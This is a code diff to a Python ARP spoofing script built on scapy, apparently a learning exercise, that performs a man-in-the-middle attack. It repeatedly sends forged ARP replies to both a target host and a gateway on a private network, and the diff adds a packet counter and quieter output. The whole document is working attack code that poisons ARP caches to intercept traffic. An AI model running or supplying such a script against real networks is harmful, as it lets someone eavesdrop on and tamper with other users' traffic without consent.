@@ -1,9 +1,9 @@
 # To be able to be Man in the middle, we need to allow data to flow through our system with port forwarding.
-# use command: echo 1 > /proc/sys/net/ipv4/ip_forward
+# use command:
 import scapy.all as scapy
 import argparse
 import time
-
+import sys
 
 def get_mac(ip_addr):  # finds the MAC addr of the target computer
     arp_request = scapy.ARP(pdst=ip_addr)
@@ -18,15 +18,19 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     # op flag: 1 = arp request, 2 = arp response
     # hwdst is the MAC addr of the target
-    print("sending packet to: " + target_mac + " with ip " + target_ip)
 
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
 
-def main(target_ip, spoof_ip): #executes man-in-the-middle
+def main(target_ip, spoof_ip):  # executes man-in-the-middle
+    packet_counter = 0
     while True:
-        spoof(target_ip,spoof_ip)
-        spoof(spoof_ip,target_ip)
+        spoof(target_ip, spoof_ip)
+        spoof(spoof_ip, target_ip)
+        packet_counter += 2
+        print("\r[+] Packets sent: " + str(packet_counter)),
+        sys.stdout.flush()
         time.sleep(2)
 
-main("10.0.2.15","10.0.2.1")
+
+main("10.0.2.15", "10.0.2.1")
